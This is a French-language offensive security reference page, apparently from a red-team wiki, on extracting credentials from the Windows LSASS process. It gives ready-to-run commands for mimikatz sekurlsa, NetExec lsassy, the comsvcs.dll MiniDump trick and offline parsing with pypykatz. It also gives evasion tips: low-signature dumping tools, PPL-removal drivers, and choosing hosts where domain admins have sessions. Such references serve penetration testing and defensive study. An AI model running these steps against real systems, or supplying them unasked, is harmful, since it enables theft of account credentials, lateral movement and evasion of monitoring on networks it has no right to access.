---
order: 1
title: "Extraction de LSASS : extraire les identifiants et tickets vivants de la mémoire"
description: "Extraire le processus LSASS pour récupérer les hash NTLM, les tickets Kerberos, et parfois les mots de passe en clair de chaque principal ayant une session sur un hôte Windows compromis."
keywords:
  - LSASS
  - mimikatz
  - sekurlsa
  - credential dumping
  - comsvcs
---

# Extraction de LSASS

Le service Local Security Authority Subsystem Service (`lsass.exe`) détient, en mémoire, le matériel d'authentification de chaque principal actuellement connecté à l'hôte : hash NTLM, tickets et clés Kerberos, et (lorsque des fournisseurs hérités tels que WDigest sont activés) mots de passe en clair. Extraire LSASS sur un hôte où un utilisateur privilégié a une session est le moyen classique de voler ses identifiants et de se déplacer latéralement en tant que lui. Cela nécessite des droits d'administrateur local (ou `SeDebugPrivilege`) sur la cible.

## Lire LSASS directement

Mimikatz lit les secrets directement dans le processus vivant :

```
privilege::debug
sekurlsa::logonpasswords        # hashes, tickets, and cleartext where present
sekurlsa::ekeys                 # Kerberos encryption keys (AES) for pass-the-key
```

Depuis l'outillage Linux contre l'hôte, NetExec enveloppe plusieurs méthodes LSASS :

```bash
nxc smb <host> -u admin -p pass -M lsassy       # remote LSASS parse with lsassy
nxc smb <host> -u admin -H <nthash> --sam --lsa
```

## Extraire puis analyser hors ligne

Toucher à LSASS avec un outil connu est fortement surveillé, un schéma courant consiste donc à produire un dump mémoire brut avec une méthode living-off-the-land et à l'analyser sur votre propre machine :

```
# Built-in comsvcs.dll MiniDump (needs the LSASS PID)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\temp\lsass.dmp full

# Then parse offline
pypykatz lsa minidump lsass.dmp
```

D'autres outils de dump (un procdump renommé, nanodump, des outils à appels système directs) existent précisément pour éviter les signatures des plus évidents.

## Ce que vous récupérez

- **Hash NTLM** : utilisables immédiatement pour le [pass-the-hash](../ntlm/pass-the-hash.md), ou cassés hors ligne.
- **Tickets Kerberos (TGT/TGS)** et **clés AES** : utilisables pour le pass-the-ticket et le pass-the-key.
- **Texte clair** : uniquement lorsqu'un fournisseur le met en cache (WDigest sur des systèmes plus anciens ou mal configurés, certains scénarios SSO) ; absent sur un hôte moderne par défaut.

## Notes d'exploitation

- Ciblez les hôtes choisis via l'[énumération des sessions](session-enumeration.md) : un hôte où un administrateur de domaine est connecté fournit un identifiant d'administrateur de domaine.
- Sur Windows moderne, LSASS peut s'exécuter en tant que processus protégé (PPL) ou derrière Credential Guard, ce qui bloque les lectures naïves ; des contournements (un pilote de suppression de PPL, ou un dump sans l'API standard) sont nécessaires, et Credential Guard supprime le texte clair et contraint la réutilisation NTLM.
- Préférez les clés AES au hash NTLM lorsqu'elles sont disponibles, car le pass-the-key AES évite le chemin RC4 plus faible que certains environnements surveillent ou restreignent.

## Outils

- **Mimikatz** (`sekurlsa::logonpasswords`, `sekurlsa::ekeys`) : le lecteur vivant de référence.
- **pypykatz** : analyse hors ligne de minidump, et analyse LSASS distante.
- **nanodump / comsvcs MiniDump** : dump à faible signature à analyser hors ligne.
- **NetExec (nxc) -M lsassy** : extraction LSASS distante.

## Références

- [adsecurity: how attackers extract credentials from LSASS](https://adsecurity.org/?p=462)
- [lsassy (Hackndo): remote LSASS extraction](https://github.com/Hackndo/lsassy)
- [pypykatz (skelsec): offline minidump parsing](https://github.com/skelsec/pypykatz)
- [Microsoft: configure added LSA protection (PPL)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
